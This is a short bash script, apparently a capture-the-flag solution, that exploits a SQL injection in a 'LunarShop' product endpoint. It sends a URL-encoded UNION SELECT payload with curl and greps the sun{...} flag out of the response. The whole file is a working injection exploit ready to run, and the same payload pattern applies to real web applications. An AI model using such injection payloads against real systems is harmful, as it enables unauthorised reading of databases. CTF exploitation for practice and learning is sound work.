#!/usr/bin/env bash
# Exploit the SQL injection in LunarShop's product endpoint to retrieve the flag

# Target endpoint
base_url="https://meteor.sunshinectf.games/product"

# SQL injection payload: union-selects the flag column three times to match column count
payload="-1%20UNION%20SELECT%201,flag,flag,flag%20FROM%20flag--"

# Full URL with injected payload
full_url="${base_url}?product_id=${payload}"

# Perform the request
response=$(curl -s "$full_url")

# Extract the flag (pattern sun{...})
flag=$(echo "$response" | grep -oE 'sun\{[^}]+\}')

echo "Flag: $flag"
